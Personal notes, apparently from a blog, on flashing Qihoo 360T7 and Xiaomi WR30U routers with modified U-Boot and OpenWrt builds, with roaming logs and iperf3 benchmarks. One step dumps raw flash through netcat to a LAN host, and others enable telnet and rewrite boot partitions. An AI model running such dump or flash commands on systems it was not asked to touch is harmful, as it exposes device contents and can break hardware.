![](https://raw.githubusercontent.com/TheRainstorm/.image-bed/main/20230815140202.png)


进入后
```bash
# 开启uboot控制台菜单
fw_setenv bootmenu_delay 3

# 挂载rootfs并开启telnet
mount_root
sed -i 's/.*local debug=.*/\tlocal debug=1/' /etc/init.d/telnet

# 修改root密码
passwd root

# 重启
reboot
```

可以选择备份固件
- 注意千万不要ping，否则无法ctrl-c
- nc结束后会自动退出，128MB的flash不到1分钟能够下载完。
```bash
# 将电脑的IP地址设置为192.168.1.8，插入路由器LAN口
# 使用nc监听3333端口并写入all.bin
# Windows系统可以使用netcat
# nc -l -p 3333 > all.bin

# 在路由器failsafe模式下开启网络
ifconfig eth0 0.0.0.0
brctl addbr br-lan
ifconfig br-lan 192.168.1.1 netmask 255.255.255.0 up
brctl addif br-lan eth0

# 读取/dev/mtd0，使用nc发送到192.168.1.8:3333
cat /dev/mtd0 | nc 192.168.1.8 3333
```

#### 3. 刷改版uboot并刷固件

改版uboot功能详细介绍：[mt798x uboot 功能介绍 (hanwckf.top)](https://cmi.hanwckf.top/p/mt798x-uboot-usage/)
- 如果使用原版uboot，则固件大小最多只能使用36MB，改版支持108MB
- 支持webui方便刷固件

步骤
- 上一步开启telnet后，正常重启系统
- telnet连接路由器，root用户名，密码为上一步修改的密码
- 本地python搭建一个http服务，路由器上通过wget下载改版uboot
- 刷写
  ```
  mtd write 360t7-fip-fixed-parts.bin fip
  ```
- 按住reset键，插上路由器电源，保持3秒左右，灯变为绿色
- 设置静态ip 192.168.1.2，即可打开路由器web界面。
- 选择固件上传即可（需要对应改版uboot分区格式的）
#### 固件选择

##### mtwifi闭源驱动

[恩山237大佬固件](https://www.right.com.cn/forum/thread-8263340-1-1.html)
- Hanwckf 的源码+18.06软件包
- 支持802.11 k/v/r无缝漫游、硬件 QOS等功能
- 通过uboot刷入过程中，不知为何刷完重启后灯灭了一段时间。刚开始还以为是进不了系统，但是后面发现没问题的。
- 界面主题是design，确实很好看
- 致命问题：由于是自编译，无法安装wireguard
- 第二个严重问题：没有使用wpad，而是使用luci-app-mtk管理无线，这导致配置FT没法


![](https://raw.githubusercontent.com/TheRainstorm/.image-bed/main/20230818012311.png)

![](https://raw.githubusercontent.com/TheRainstorm/.image-bed/main/20230818012256.png)

[hanwckf/immortalwrt-mt798x (github.com)](https://github.com/hanwckf/immortalwrt-mt798x)
- [immortalwrt-mt798x项目介绍 (hanwckf.top)](https://cmi.hanwckf.top/p/immortalwrt-mt798x/)

QWRT(lean)
[【新提醒】潘多拉 QWRT MT7981 360T7 R23.5.4 高性能闭源固件发布（原生无线配置）-OPENWRT专版-恩山无线论坛 - Powered by Discuz! (right.com.cn)](https://www.right.com.cn/forum/thread-8283847-1-1.html)
- lua界面
- 原版无线配置

加群后，群主告诉我，闭源驱动只能和闭源驱动组mesh，并且也不太支持802.11r。

ImmortalwrtARM
[【新提醒】【2023-08-12】小米WR30U闭源驱动immortalwrt固件-小米无线路由器以及小米无线相关的设备-恩山无线论坛 - Powered by Discuz! (right.com.cn)](https://www.right.com.cn/forum/thread-5053708-1-1.html)
- [[避坑] 360T7 - V2EX](https://www.v2ex.com/t/930398)在这里看到说padavanonly/immortalwrtARM FT正常

##### 不确定

[原版immortalwrt](https://firmware-selector.immortalwrt.org/?version=23.05.0-rc3&target=mediatek%2Ffilogic&id=qihoo_360t7-ubootmod)
- 使用了下发现wan口设置dhcp刚开始总有问题，虽然最后通过手动重启dnsmasq方式解决了，但是确实不是很顺利。


自编译

大佬你好。我购买了 360T7 和 wr30u 来对家中网络进行升级。但是由于这两个都没有官方 openwrt 支持，我用的都是别人编译的版本。
360T7 用的是这个[hanwckf/immortalwrt-mt798x (github.com)]( https://github.com/hanwckf/immortalwrt-mt798x)，但是它的无限配置是 luci-app-mtk ，我找不到 802.11r 的配置选项。
wr30u 用的是这个 https://www.right.com.cn/forum/thread-8284824-1-1.html ，它有 802.11r 但是却啥都不能设置，我查看日志看到 FT 会有 The PMKID is invalid 错误。现象就是连上它之后压根不会漫游，甚至强度低于-80db 了都不会，只能手动断开 wifi 重连。

看到你测试了无线开源和闭源的固件，我想问下开源的固件在那找。我不需要最强的性能，我只想要它的设置和官方 openwrt 一样，可以一起工作就行。😭

注：家中网络原本是 ax6s(做 ac ）+3 R3g （ ap ），802.11r 工作得很正常。




### 小米WR30U

#### 刷机

一个比较广泛的教程：[小米 WR30U 解锁 SSH 刷 openwrt，最有性价比的百元路由器 (qust.me)](https://blog.qust.me/wr30u)

这里的uboot用的是哪个不清楚，不是


恢复uboot：[【新提醒】小米WR30U 恢复原厂固件的几种方法-小米无线路由器以及小米无线相关的设备-恩山无线论坛 - Powered by Discuz! (right.com.cn)](https://www.right.com.cn/forum/thread-8291160-1-1.html)

#### 固件

- QWRT
[【新提醒】潘多拉 QWRT MT7981 小米 WR30U 联通版 高性能闭源固件发布（原生无线配置）-OPENWRT专版-恩山无线论坛 - Powered by Discuz! (right.com.cn)](https://www.right.com.cn/forum/thread-8284824-1-1.html)


[X-Wrt, for IoT, a custom Distribution for OpenWrt](https://x-wrt.com/)
### FT

[OpenWRT 路由器快速漫游（802.11r）配置教程以及深度解析_路由器_什么值得买 (smzdm.com)](https://post.smzdm.com/p/a6lr03wg/)
```

```

```
Thu Aug 17 11:31:19 2023 kern.warn kernel: [164938.908390] 7981@C13L2,MacTableInsertEntry() 1537: New Sta:2a:85:8f:ff:be:e3
Thu Aug 17 11:31:19 2023 kern.err kernel: [164938.915643] 7981@C14L1,FT_AuthReqHandler() 536: The MDIE is invalid(Peer MDID= 17 17, My MDID = 82 84
Thu Aug 17 11:31:22 2023 kern.notice kernel: [164942.301972] 7981@C08L3,ap_peer_auth_req_at_idle_action() 717: AUTH - MBSS(1), Rcv AUTH seq#1, Alg=2, Status=0 from [wcid=1]2a:85:8f:ff:be:e3
Thu Aug 17 11:31:22 2023 kern.err kernel: [164942.314678] 7981@C14L1,FT_AuthReqHandler() 536: The MDIE is invalid(Peer MDID= 17 17, My MDID = 82 84
Thu Aug 17 11:31:26 2023 kern.notice kernel: [164945.762095] 7981@C08L3,ap_peer_auth_req_at_idle_action() 717: AUTH - MBSS(1), Rcv AUTH seq#1, Alg=2, Status=0 from [wcid=1]2a:85:8f:ff:be:e3
Thu Aug 17 11:31:26 2023 kern.err kernel: [164945.774793] 7981@C14L1,FT_AuthReqHandler() 536: The MDIE is invalid(Peer MDID= 17 17, My MDID = 82 84
Thu Aug 17 11:31:32 2023 kern.warn kernel: [164952.375145] 7981@C01L2,wifi_sys_disconn_act() 1002:  wdev_idx=1
Thu Aug 17 11:31:32 2023 kern.warn kernel: [164952.381500] 7981@C13L2,MacTableDeleteEntry() 1793: Del Sta:2a:85:8f:ff:be:e3
```

客厅r3g
```
Thu Aug 17 11:30:05 2023 daemon.debug hostapd: wlan1: STA 2a:85:8f:ff:be:e3 MLME: MLME-AUTHENTICATE.indication(2a:85:8f:ff:be:e3, OPEN_SYSTEM)
Thu Aug 17 11:30:05 2023 daemon.debug hostapd: wlan1: STA 2a:85:8f:ff:be:e3 MLME: MLME-DELETEKEYS.request(2a:85:8f:ff:be:e3)
Thu Aug 17 11:30:05 2023 daemon.info hostapd: wlan1: STA 2a:85:8f:ff:be:e3 IEEE 802.11: authenticated
Thu Aug 17 11:30:05 2023 daemon.debug hostapd: wlan1: STA 2a:85:8f:ff:be:e3 IEEE 802.11: association OK (aid 1)
Thu Aug 17 11:30:05 2023 daemon.info hostapd: wlan1: STA 2a:85:8f:ff:be:e3 IEEE 802.11: associated (aid 1)
Thu Aug 17 11:30:05 2023 daemon.debug hostapd: wlan1: STA 2a:85:8f:ff:be:e3 MLME: MLME-ASSOCIATE.indication(2a:85:8f:ff:be:e3)
Thu Aug 17 11:30:05 2023 daemon.debug hostapd: wlan1: STA 2a:85:8f:ff:be:e3 MLME: MLME-DELETEKEYS.request(2a:85:8f:ff:be:e3)
Thu Aug 17 11:30:05 2023 daemon.debug hostapd: wlan1: STA 2a:85:8f:ff:be:e3 IEEE 802.11: binding station to interface 'wlan1'
Thu Aug 17 11:30:05 2023 daemon.debug hostapd: wlan1: STA 2a:85:8f:ff:be:e3 WPA: event 1 notification
Thu Aug 17 11:30:05 2023 daemon.debug hostapd: wlan1: STA 2a:85:8f:ff:be:e3 WPA: start authentication
Thu Aug 17 11:30:05 2023 daemon.debug hostapd: wlan1: STA 2a:85:8f:ff:be:e3 IEEE 802.1X: unauthorizing port
Thu Aug 17 11:30:05 2023 daemon.debug hostapd: wlan1: STA 2a:85:8f:ff:be:e3 WPA: sending 1/4 msg of 4-Way Handshake
Thu Aug 17 11:30:05 2023 daemon.debug hostapd: wlan1: STA 2a:85:8f:ff:be:e3 WPA: received EAPOL-Key frame (2/4 Pairwise)
Thu Aug 17 11:30:05 2023 daemon.debug hostapd: wlan1: STA 2a:85:8f:ff:be:e3 WPA: sending 3/4 msg of 4-Way Handshake
Thu Aug 17 11:30:05 2023 daemon.debug hostapd: wlan1: STA 2a:85:8f:ff:be:e3 WPA: received EAPOL-Key frame (4/4 Pairwise)
Thu Aug 17 11:30:05 2023 daemon.notice hostapd: wlan1: AP-STA-CONNECTED 2a:85:8f:ff:be:e3
Thu Aug 17 11:30:05 2023 daemon.debug hostapd: wlan1: STA 2a:85:8f:ff:be:e3 IEEE 802.1X: authorizing port
Thu Aug 17 11:30:05 2023 daemon.info hostapd: wlan1: STA 2a:85:8f:ff:be:e3 RADIUS: starting accounting session CDB345D82723F2E1
Thu Aug 17 11:30:05 2023 daemon.info hostapd: wlan1: STA 2a:85:8f:ff:be:e3 WPA: pairwise key handshake completed (RSN)
Thu Aug 17 11:30:05 2023 daemon.notice hostapd: wlan1: EAPOL-4WAY-HS-COMPLETED 2a:85:8f:ff:be:e3

Thu Aug 17 11:36:38 2023 daemon.notice hostapd: wlan1: AP-STA-DISCONNECTED 2a:85:8f:ff:be:e3
Thu Aug 17 11:36:38 2023 daemon.info hostapd: wlan1: STA 2a:85:8f:ff:be:e3 IEEE 802.11: disassociated due to inactivity
Thu Aug 17 11:36:38 2023 daemon.debug hostapd: wlan1: STA 2a:85:8f:ff:be:e3 MLME: MLME-DISASSOCIATE.indication(2a:85:8f:ff:be:e3, 4)
Thu Aug 17 11:36:38 2023 daemon.debug hostapd: wlan1: STA 2a:85:8f:ff:be:e3 MLME: MLME-DELETEKEYS.request(2a:85:8f:ff:be:e3)
Thu Aug 17 11:36:39 2023 daemon.info hostapd: wlan1: STA 2a:85:8f:ff:be:e3 IEEE 802.11: deauthenticated due to inactivity (timer DEAUTH/REMOVE)
Thu Aug 17 11:36:39 2023 daemon.debug hostapd: wlan1: STA 2a:85:8f:ff:be:e3 MLME: MLME-DEAUTHENTICATE.indication(2a:85:8f:ff:be:e3, 2)
Thu Aug 17 11:36:39 2023 daemon.debug hostapd: wlan1: STA 2a:85:8f:ff:be:e3 MLME: MLME-DELETEKEYS.request(2a:85:8f:ff:be:e3)
```

op3(ax6s)
```
Thu Aug 17 11:30:57 2023 daemon.debug hostapd: wlan1: STA 2a:85:8f:ff:be:e3 IEEE 802.11: binding station to interface 'wlan1'
Thu Aug 17 11:30:57 2023 daemon.debug hostapd: wlan1: STA 2a:85:8f:ff:be:e3 IEEE 802.11: authentication OK (FT)
Thu Aug 17 11:30:57 2023 daemon.debug hostapd: wlan1: STA 2a:85:8f:ff:be:e3 MLME: MLME-AUTHENTICATE.indication(2a:85:8f:ff:be:e3, FT)
Thu Aug 17 11:30:57 2023 daemon.debug hostapd: wlan1: STA 2a:85:8f:ff:be:e3 IEEE 802.11: association OK (aid 1)
Thu Aug 17 11:30:57 2023 daemon.info hostapd: wlan1: STA 2a:85:8f:ff:be:e3 IEEE 802.11: associated (aid 1)
Thu Aug 17 11:30:57 2023 daemon.notice hostapd: wlan1: AP-STA-CONNECTED 2a:85:8f:ff:be:e3
Thu Aug 17 11:30:57 2023 daemon.debug hostapd: wlan1: STA 2a:85:8f:ff:be:e3 MLME: MLME-REASSOCIATE.indication(2a:85:8f:ff:be:e3)
Thu Aug 17 11:30:57 2023 daemon.debug hostapd: wlan1: STA 2a:85:8f:ff:be:e3 IEEE 802.11: binding station to interface 'wlan1'
Thu Aug 17 11:30:57 2023 daemon.debug hostapd: wlan1: STA 2a:85:8f:ff:be:e3 WPA: event 6 notification
Thu Aug 17 11:30:57 2023 daemon.debug hostapd: wlan1: STA 2a:85:8f:ff:be:e3 WPA: FT authentication already completed - do not start 4-way handshake
```
#### 其它

原厂系统
![](https://raw.githubusercontent.com/TheRainstorm/.image-bed/main/20230815141433.png)
支持的功能
![](https://raw.githubusercontent.com/TheRainstorm/.image-bed/main/20230815141449.png)

从咸鱼上买的，路由器系统里可以看到1月份的日志。
![](https://raw.githubusercontent.com/TheRainstorm/.image-bed/main/20230815141342.png)

uboot控制台
![](https://raw.githubusercontent.com/TheRainstorm/.image-bed/main/20230815141529.png)

![](https://raw.githubusercontent.com/TheRainstorm/.image-bed/main/20230815141559.png)

webui刷机时串口输出
![](https://raw.githubusercontent.com/TheRainstorm/.image-bed/main/20230815141615.png)


## 硬件性能测试(wg带宽)

### king3399

未加密
```
root@op1 ➜  ~ iperf3 -c 114.214.236.90

[ ID] Interval           Transfer     Bitrate         Retr
[  5]   0.00-10.00  sec  1.10 GBytes   943 Mbits/sec   70             sender
[  5]   0.00-10.05  sec  1.09 GBytes   936 Mbits/sec                  receiver

root@op1 ➜  ~ iperf3 -c king6.yfycloud.top
[ ID] Interval           Transfer     Bitrate         Retr
[  5]   0.00-10.00  sec  1.08 GBytes   924 Mbits/sec   29             sender
[  5]   0.00-10.04  sec  1.07 GBytes   918 Mbits/sec                  receiver
```

wg
```
➜  ~ iperf3 -c king
[ ID] Interval           Transfer     Bitrate         Retr
[  5]   0.00-10.00  sec  1.04 GBytes   893 Mbits/sec  70559             sender
[  5]   0.00-10.04  sec  1.04 GBytes   887 Mbits/sec                  receiver

➜  ~ iperf3 -c king -R
[ ID] Interval           Transfer     Bitrate         Retr
[  5]   0.00-10.04  sec   691 MBytes   577 Mbits/sec    2             sender
[  5]   0.00-10.00  sec   688 MBytes   577 Mbits/sec                  receiver
```

### p2w

未加密，居然跑不满千兆（连接中间通过了一个usb 千兆网卡）
```
➜  ~ iperf3 -c p2w
[ ID] Interval           Transfer     Bitrate         Retr
[  5]   0.00-10.00  sec   754 MBytes   633 Mbits/sec  344             sender
[  5]   0.00-10.00  sec   752 MBytes   630 Mbits/sec                  receiver

➜  ~ iperf3 -c p2w -R
[ ID] Interval           Transfer     Bitrate         Retr
[  5]   0.00-10.01  sec   902 MBytes   757 Mbits/sec  738             sender
[  5]   0.00-10.00  sec   902 MBytes   757 Mbits/sec                  receiver
```

### ax6s

未加密（中间是一个usb千兆网卡）
```
(base) yfy@Tianyi ➜  ~ iperf3 -c 192.168.36.2
[ ID] Interval           Transfer     Bitrate         Retr
[  5]   0.00-10.00  sec  1.10 GBytes   942 Mbits/sec    0             sender
[  5]   0.00-10.01  sec  1.09 GBytes   939 Mbits/sec                  receiver

(base) yfy@Tianyi ➜  ~ iperf3 -c 192.168.36.2 -R
[ ID] Interval           Transfer     Bitrate         Retr
[  5]   0.00-10.00  sec  1.09 GBytes   940 Mbits/sec    0             sender
[  5]   0.00-10.00  sec  1.09 GBytes   939 Mbits/sec                  receiver
```

wg
复用之前的home到学校数据
baseline：ipv6直连
```
home下载
[SUM]   0.00-10.00  sec   798 MBytes   669 Mbits/sec  468             sender
[SUM]   0.00-10.05  sec   786 MBytes   656 Mbits/sec                  receiver

home上传
[SUM]   0.00-10.06  sec   925 MBytes   771 Mbits/sec  1185             sender
[SUM]   0.00-10.00  sec   918 MBytes   770 Mbits/sec                  receiver
```

```
➜  ~ iperf3 -c op3
[ ID] Interval           Transfer     Bitrate         Retr
[  5]   0.00-10.00  sec   163 MBytes   137 Mbits/sec    0             sender
[  5]   0.00-10.05  sec   161 MBytes   134 Mbits/sec                  receiver

➜  ~ iperf3 -c op3 -P 5
[SUM]   0.00-10.00  sec   537 MBytes   450 Mbits/sec  302             sender
[SUM]   0.00-10.06  sec   525 MBytes   438 Mbits/sec                  receiver

➜  ~ iperf3 -c op3 -R
[ ID] Interval           Transfer     Bitrate         Retr
[  5]   0.00-10.05  sec   235 MBytes   196 Mbits/sec  170             sender
[  5]   0.00-10.00  sec   234 MBytes   196 Mbits/sec                  receiver

➜  ~ iperf3 -c op3 -R -P 5
[SUM]   0.00-10.05  sec   504 MBytes   421 Mbits/sec    0             sender
[SUM]   0.00-10.00  sec   497 MBytes   417 Mbits/sec                  receiver
```
恐怖的CPU占用
![](https://raw.githubusercontent.com/TheRainstorm/.image-bed/main/20230810160001.png)
